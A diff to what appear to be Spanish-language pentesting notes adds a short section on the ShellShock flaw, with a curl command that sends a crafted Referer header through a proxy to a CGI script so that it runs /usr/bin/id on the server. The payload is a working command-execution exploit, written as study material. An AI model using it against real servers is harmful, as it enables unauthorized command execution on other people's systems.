@@ -1539,6 +1539,14 @@ Las consultas las podemos realizar también desde **curl**, empleando para ello 
 $~ curl --proxy ip:puerto http://ip/cgi-bin/status # A modo de ejemplo
 ```
 
+Suponiendo que la web posteriormente es vulnerable a un ataque **ShellShock**, podríamos realizar la siguiente petición para ejecutar comandos sobre el sistema:
+
+```bash
+curl -v --proxy ip:puerto \
+  http://ip/cgi-bin/status \ 
+  -H "Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id; exit"
+```
+
 ### Pentesting Web
 
 #### LFI
